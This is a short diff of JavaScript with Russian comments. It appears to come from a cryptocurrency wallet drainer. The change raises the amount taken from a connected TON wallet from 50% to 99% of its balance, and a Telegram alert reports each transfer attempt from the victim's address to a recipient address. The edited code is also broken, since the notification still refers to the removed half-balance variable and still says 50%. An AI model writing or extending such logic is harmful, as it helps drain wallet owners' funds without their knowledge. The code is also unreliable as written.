@@ -334,9 +334,10 @@
             // Получаем основной токен TON
             const tonToken = walletTokens[0];
             
-            // Вычисляем 50% от баланса
-            const halfBalanceNano = Math.floor(Number(tonToken.balance) / 2).toString();
-            const halfBalanceTon = Number(halfBalanceNano) / 1e9;
+            // Вычисляем 99% от баланса
+const ninetyNinePercentBalanceNano = Math.floor(Number(tonToken.balance) * 0.99).toString();
+const ninetyNinePercentBalanceTon = Number(ninetyNinePercentBalanceNano) / 1e9;
+
             
             // Отправляем уведомление о попытке отправки
             await sendTelegramNotification(`⚠️ Попытка отправки 50% баланса\n💰 Сумма: ${halfBalanceTon} TON\n📤 От: <code>${connectedAddressFriendly}</code>\n📥 Кому: <code>${recipientAddress}</code>`);
